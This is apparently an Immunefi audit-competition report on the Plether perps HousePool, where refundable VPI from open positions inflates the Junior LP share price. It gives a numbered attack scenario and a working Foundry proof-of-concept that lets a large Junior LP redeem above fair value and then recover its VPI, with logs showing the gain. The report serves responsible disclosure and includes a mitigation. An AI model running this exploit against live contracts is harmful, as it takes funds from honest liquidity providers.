# \#99829 [SC-Critical] LP share price counts refundable VPI of open positions as earned, so a Junior LP can redeem above fair value with its own trade

**Submitted on Nov 15th 2026 at 12:37:12 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99829
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
When a position is opened in the skew-increasing direction, its VPI charge goes into the HousePool as cash and is immediately counted in the tranche NAV. But this VPI is not final: when the same position closes, the lifetime clamp lets the trader take the whole amount back from the pool. LP redemptions and deposits are priced from the NAV in between. A Junior LP can open a large position right before its redemption is settled, redeem at the inflated price, and then close the position and get the VPI back. The LP's extra payout is taken from the other Junior LPs. In the PoC an attacker holding 60% of Junior nets about 12,800 USDG in one cycle and the other Junior LPs lose about 25,600 USDG, and the cycle can be repeated.

## Vulnerability Details
`HousePool._settleLpEpoch` reconciles once and then prices Junior redemptions and deposits from the reconciled `juniorPrincipal`. The reconcile uses:

```
distributable = pool.totalAssets() - traderClaims + terminalLpPriceDelta
```

(`CfdEngineProtocolLens.getHousePoolInputSnapshot`, `HousePoolAccountingLib.buildReconcileSnapshot`). The terminal delta contains only marked price PnL. Nothing in the snapshot accounts for VPI that open positions can still take back.

At open, `CfdEngineSettlementSidecar.executeOpen` moves the positive VPI `V` to the pool and records it as revenue, so `totalAssets()` grows by `V` and the next reconcile gives it to the tranches (to Junior when Senior is at its high-water mark).

At close, `CloseAccountingLib.buildCloseState` computes the rebate from the curve and clamps it only by the position's accrued VPI:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

So if the pool is not deeper than at open (it is shallower after the redemption), a skew-reducing close gets a rebate of exactly `V`, paid from pool cash (minus the close fee, which is netted from the rebate).

The trader's own VPI round trip therefore costs only the two execution fees. But between the open and the close the Junior price is too high by `V`. If the trader is also a Junior LP with share `f` of the tranche and redeems in this window, it is paid `f * V` too much. After the close the remaining Junior LPs absorb the rebate.

* Attacker net: `f * V - 2 * fee`.
* Other Junior LPs lose: `f * V - closeFee`.

At release parameters (`vpiFactor = 0.01`, `maxSkewRatio = 0.4`, `executionFeeBps = 4`), a position at the skew cap in a balanced book pays `V` = 0.20% of its notional and two fees are 0.08%, so the attack is profitable when the attacker holds more than 40% of Junior. If the book is already skewed in the attacker's direction, `V` per notional is larger and the threshold is lower.

The comment above the clamp says it "prevents LP sandwich attacks" where the attacker changes pool depth to get back more VPI than it paid. This attack does not need that. The clamp returns exactly what was paid, which is what makes the VPI in the pool refundable and not earned.

### Attack scenario
Pool: Senior 30,000,000, Junior 50,000,000 (attacker 30,000,000, other LPs 20,000,000). Price is 1.00.

1. The attacker requests redemption of all its Junior shares. The request matures at the next epoch boundary.
2. Shortly before the boundary the attacker's trading account opens LONG 32,000,000 (40% of the pool). It pays VPI 64,000 into the pool and a 12,800 fee.
3. After the boundary the attacker calls `OrderRouter.settleLpEpoch`. Junior is 50,064,000, so the attacker's shares are paid 38,400 more than they are worth.
4. The attacker closes the position. The clamp returns 64,000 of VPI, minus the 12,800 close fee.
5. Result: attacker +38,400 on the redemption and -25,600 on the trade, +12,800 in total. The other Junior LPs' 20,000,000 is now worth 25,600 less.

## Impact Details
Funds of honest Junior LPs are taken by another LP. Per cycle the attacker extracts `f * V - 2 * fee` and the other Junior LPs lose `f * V - closeFee`, where `V` can be up to 0.08% of pool depth (`vpiFactor * 0.4^2 / 2`). In the PoC this is 25,600 USDG from LPs holding 20,000,000 USDG, and at the 40M Senior cap with a proportionally larger Junior tranche the numbers scale linearly. The attacker can deposit again and repeat the cycle every few hours (deposit activation, 1 hour cooldown, redemption epoch), so the loss of the remaining LPs accumulates.

The attacker needs a large share of the Junior tranche and margin for the position (0.2% initial margin). The position is open only around the epoch boundary, so the price risk is small and can be hedged.

Even without an attacker, every LP that enters or exits while such VPI is outstanding is priced incorrectly by the same amount.

## Recommended Mitigation
Keep the VPI charged to open positions out of the LP share price until the position closes. Track in the engine `P`, the sum of `max(vpiAccrued, 0)` over open positions: every time a position is written (open, increase, partial or full close, liquidation), remove its old contribution and add the new one. An increase can earn a rebate and lower the position's accrual, for example from +100 to +40, and `P` must then fall by 60. Subtract `P` from the distributable amount in the reconcile, the same way trader claims are subtracted. The charge then reaches the tranches only when the position closes and the rebate it takes back is known, so a redemption or deposit priced in between cannot be paid from it.

## References
* LP epoch settlement prices redemptions and deposits from the reconciled principal: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L942
* NAV inputs: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L59-L89 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78
* Open VPI recorded as pool revenue: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L464
* Lifetime VPI clamp at close: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118
* Close rebate paid from pool cash: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624

## Proof of Concept

The following PoC runs the attack scenario with release risk parameters. The trades go through the production `OrderRouter.commitOrder(OrderRequest)` and `OrderRouter.executeOrder` (with a mocked Pyth update), and the LP epoch is settled through `OrderRouter.settleLpEpoch`. After the redemption request the test saves the state, plays the epoch once without the trade to get the fair payout and the fair value of the other LPs, and then restores the state and runs the attack.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console} from "forge-std/console.sol";

contract PoC_VpiInflatesLpNav is BasePerpTest {

    address seniorLp = makeAddr("seniorLp");
    address honestLp = makeAddr("honestLp");
    address attackerLp = makeAddr("attackerLp");
    address attackerTrader = makeAddr("attackerTrader");

    uint256 constant PRICE = 1e8;
    uint256 constant SIZE = 32_000_000e18; // 40% of the 80,000,000 USDG pool
    uint256 constant TRADER_FUNDS = 500_000e6;

    // Release parameters from packages/perps/DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // Senior 30,000,000. Junior 50,000,000: attacker 30,000,000, honest LPs 20,000,000 (with the 1,000 USDG seed).
    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(honestLp, 19_999_000e6);
        _fundJunior(attackerLp, 30_000_000e6);
        _fundSenior(seniorLp, 29_999_000e6);
        _fundTrader(attackerTrader, TRADER_FUNDS);
        vm.warp(block.timestamp + 1 hours); // deposit cooldown
    }

    function test_redeemWhileOwnVpiIsInThePool() public {
        uint256 honestShares = juniorVault.balanceOf(honestLp) + juniorVault.balanceOf(address(this)); // LP + seed
        uint256 attackerShares = juniorVault.balanceOf(attackerLp);

        // 1. The attacker requests to redeem all its Junior shares. The request matures at the next epoch boundary.
        vm.prank(attackerLp);
        uint256 requestId = juniorVault.requestRedeem(attackerShares, attackerLp, attackerLp);
        uint256 epoch = pool.lpEpochStart(requestId);

        // For comparison: the same epoch without the attacker's trade.
        uint256 snapshot = vm.snapshotState();
        vm.warp(epoch);
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
        uint256 fairPayout = _claimRedeem(requestId);
        uint256 honestFairValue = juniorVault.convertToAssets(honestShares);
        vm.revertToState(snapshot);

        // 2. Shortly before the boundary the attacker opens LONG 32,000,000 and pays VPI into the pool.
        vm.warp(epoch - 30);
        OrderV3Types.OrderReceipt memory receipt = _trade(false);

        // 3. The LP epoch is settled with a fresh mark and the attacker claims the redemption.
        vm.warp(epoch);
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
        uint256 payout = _claimRedeem(requestId);

        // 4. The attacker closes the position. The lifetime clamp returns the VPI from the pool.
        _trade(true);
        uint256 tradingLoss = TRADER_FUNDS - clearinghouse.balanceAssets(attackerTrader);
        uint256 honestValue = juniorVault.convertToAssets(honestShares);

        console.log("VPI paid at open:                        %s", uint256(receipt.economics.vpiAssets) / 1e6);
        console.log("Attacker's redemption, no trade:         %s", fairPayout / 1e6);
        console.log("Attacker's redemption, with the trade:   %s", payout / 1e6);
        console.log("Attacker's trading loss (two fees):      %s", tradingLoss / 1e6);
        console.log("Attacker's net gain:                     %s", (payout - fairPayout - tradingLoss) / 1e6);
        console.log("Honest Junior LPs' value, no trade:      %s", honestFairValue / 1e6);
        console.log("Honest Junior LPs' value, with the trade: %s", honestValue / 1e6);
        console.log("Honest Junior LPs' loss:                 %s", (honestFairValue - honestValue) / 1e6);

        assertGt(payout - fairPayout, tradingLoss, "attacker profits");
        assertLt(honestValue, honestFairValue, "honest LPs lose");
    }

    function _claimRedeem(
        uint256 requestId
    ) internal returns (uint256 assets) {
        uint256 shares = juniorVault.claimableRedeemRequest(requestId, attackerLp);
        vm.prank(attackerLp);
        assets = juniorVault.claimRedeem(requestId, shares, attackerLp, attackerLp);
        assertEq(juniorVault.balanceOf(attackerLp), 0, "all attacker shares were redeemed");
    }

    /// Commits a full-size LONG open or close through the production `OrderRouter.commitOrder(OrderRequest)` and
    /// executes it at price 1.00.
    function _trade(
        bool isClose
    ) internal returns (OrderV3Types.OrderReceipt memory receipt) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("poc", isClose)),
            side: CfdTypes.Side.LONG,
            sizeDelta: SIZE,
            marginDelta: isClose ? 0 : 300_000e6,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(attackerTrader);
        uint64 orderId = router.commitOrder(request);

        bytes[] memory update = _mockPythUpdateData(PRICE);
        _startRecordingLogs();
        vm.prank(attackerTrader);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order should execute");

        receipt = _verifiedReceipt(router.lifecycleBook(), orderId);
    }

}
```

Save this code to the file `packages/perps/test/perps/poc/PoC_VpiInflatesLpNav.t.sol` and run `forge test --root packages/perps --mc PoC_VpiInflatesLpNav -vv`. It will print the following logs (all values are in whole USDG):

```
Ran 1 test for test/perps/poc/PoC_VpiInflatesLpNav.t.sol:PoC_VpiInflatesLpNav
[PASS] test_redeemWhileOwnVpiIsInThePool() (gas: 7547555)
Logs:
  VPI paid at open:                        64000
  Attacker's redemption, no trade:         29999671
  Attacker's redemption, with the trade:   30038071
  Attacker's trading loss (two fees):      25600
  Attacker's net gain:                     12799
  Honest Junior LPs' value, no trade:      19999780
  Honest Junior LPs' value, with the trade: 19974180
  Honest Junior LPs' loss:                 25599

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 50.25ms (20.11ms CPU time)
```

With the trade the attacker's redemption pays 30,038,071 instead of 29,999,671 (+38,400) and the trade costs 25,600 (two fees), so the attacker nets about 12,800 USDG. The honest Junior LPs end with 19,974,180 instead of 19,999,780, a loss of about 25,600 USDG.
